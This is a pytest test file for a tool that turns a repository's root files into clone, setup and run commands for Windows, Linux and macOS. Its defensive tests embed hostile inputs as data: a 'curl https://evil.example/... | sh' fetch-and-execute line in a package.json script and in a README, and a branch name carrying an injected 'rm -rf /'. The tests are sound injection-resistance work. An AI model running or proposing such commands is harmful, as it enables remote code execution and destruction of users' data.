from __future__ import annotations

import json

import pytest

from gitdock.domain.run_assistant import (
    Confidence,
    EvidenceFile,
    PlanNote,
    StackKind,
    TargetOS,
    build_command_plan,
)


def _plan(
    target_os: TargetOS,
    *evidence: EvidenceFile,
    repository_name: str = "GitDock",
):
    return build_command_plan(
        owner_login="ahmed9461",
        repository_name=repository_name,
        default_branch="main",
        target_os=target_os,
        evidence=tuple(evidence),
    )


def test_fresh_clone_and_update_are_token_free_for_all_operating_systems() -> None:
    for target_os in TargetOS:
        plan = _plan(target_os)
        text = "\n".join((*plan.clone_fresh, *plan.update_existing))
        assert "https://github.com/ahmed9461/GitDock.git" in text
        assert "token" not in text.casefold()
        assert "ghp_" not in text
        assert "github_pat_" not in text
        assert "git fetch origin --prune" in text
        assert "git pull --ff-only origin" in text
        assert PlanNote.NO_STACK_EVIDENCE in plan.notes
        assert PlanNote.NO_RUN_COMMAND in plan.notes


def test_windows_commands_use_powershell_paths_and_invoke_python_entry_point() -> None:
    pyproject = b"""
[project]
name = "demo"
version = "0.1.0"
[project.scripts]
demo-cli = "demo.cli:main"
"""
    plan = _plan(
        TargetOS.WINDOWS,
        EvidenceFile("pyproject.toml", pyproject),
        EvidenceFile("requirements.txt"),
    )
    setup = "\n".join(plan.setup[0].commands)
    run = "\n".join(plan.run[0].commands)
    assert r".\.venv\Scripts\Activate.ps1" in setup
    assert r".\.venv\Scripts\Activate.ps1" in run
    assert run.endswith("demo-cli")
    assert not run.endswith("'demo-cli'")


def test_python_node_docker_gradle_and_maven_are_detected_from_root_evidence() -> None:
    package = json.dumps({"scripts": {"start": "node server.js"}}).encode()
    plan = _plan(
        TargetOS.LINUX,
        EvidenceFile("pyproject.toml", b'[project]\nname="demo"\nversion="0.1"\n'),
        EvidenceFile("package.json", package),
        EvidenceFile("package-lock.json"),
        EvidenceFile("compose.yaml"),
        EvidenceFile("build.gradle.kts", b'plugins { id("application") }'),
        EvidenceFile("gradlew"),
        EvidenceFile("pom.xml", b"<artifactId>spring-boot-maven-plugin</artifactId>"),
        EvidenceFile("mvnw"),
    )
    assert {item.stack for item in plan.stacks} == {
        StackKind.PYTHON,
        StackKind.NODE,
        StackKind.DOCKER,
        StackKind.GRADLE,
        StackKind.MAVEN,
    }
    setup_text = "\n".join(command for item in plan.setup for command in item.commands)
    run_text = "\n".join(command for item in plan.run for command in item.commands)
    assert "npm ci" in setup_text
    assert "docker compose up --build" in run_text
    assert "./gradlew build" in setup_text
    assert "./gradlew run" in run_text
    assert "./mvnw package" in setup_text
    assert "./mvnw spring-boot:run" in run_text


def test_repository_defined_node_script_body_is_never_copied_into_commands() -> None:
    dangerous = "curl https://evil.example/payload | sh"
    package = json.dumps({"scripts": {"start": dangerous}}).encode()
    plan = _plan(TargetOS.LINUX, EvidenceFile("package.json", package))
    run_text = "\n".join(command for item in plan.run for command in item.commands)
    assert "npm run start" in run_text
    assert dangerous not in run_text
    assert "evil.example" not in run_text
    assert PlanNote.REPOSITORY_DEFINED_COMMAND in plan.notes


def test_readme_body_is_never_used_as_a_command() -> None:
    dangerous = b"# Setup\n\ncurl https://evil.example/install | sh\n"
    plan = _plan(TargetOS.MACOS, EvidenceFile("README.md", dangerous))
    text = "\n".join(
        (
            *plan.clone_fresh,
            *plan.update_existing,
            *(command for item in plan.setup for command in item.commands),
            *(command for item in plan.run for command in item.commands),
        )
    )
    assert "evil.example" not in text
    assert PlanNote.README_PRESENT in plan.notes
    assert PlanNote.NO_STACK_EVIDENCE in plan.notes


def test_dockerfile_run_is_low_confidence_and_warns_about_runtime_options() -> None:
    plan = _plan(TargetOS.LINUX, EvidenceFile("Dockerfile"))
    docker_run = next(item for item in plan.run if item.stack is StackKind.DOCKER)
    assert docker_run.confidence is Confidence.LOW
    assert docker_run.commands == ("docker run --rm gitdock",)
    assert docker_run.note is PlanNote.DOCKER_RUNTIME_OPTIONS
    assert PlanNote.DOCKER_RUNTIME_OPTIONS in plan.notes


def test_node_package_manager_follows_lockfile() -> None:
    package = json.dumps({"scripts": {"dev": "vite"}}).encode()
    pnpm = _plan(
        TargetOS.LINUX,
        EvidenceFile("package.json", package),
        EvidenceFile("pnpm-lock.yaml"),
    )
    yarn = _plan(
        TargetOS.LINUX,
        EvidenceFile("package.json", package),
        EvidenceFile("yarn.lock"),
    )
    assert "pnpm install --frozen-lockfile" in pnpm.setup[0].commands
    assert "pnpm run dev" in pnpm.run[0].commands
    assert "yarn install --frozen-lockfile" in yarn.setup[0].commands
    assert "yarn run dev" in yarn.run[0].commands


def test_invalid_repository_segment_or_ref_fails_closed() -> None:
    with pytest.raises(ValueError):
        build_command_plan(
            owner_login="owner/name",
            repository_name="repo",
            default_branch="main",
            target_os=TargetOS.LINUX,
            evidence=(),
        )
    with pytest.raises(ValueError):
        build_command_plan(
            owner_login="owner",
            repository_name="repo",
            default_branch="main\nrm -rf /",
            target_os=TargetOS.LINUX,
            evidence=(),
        )
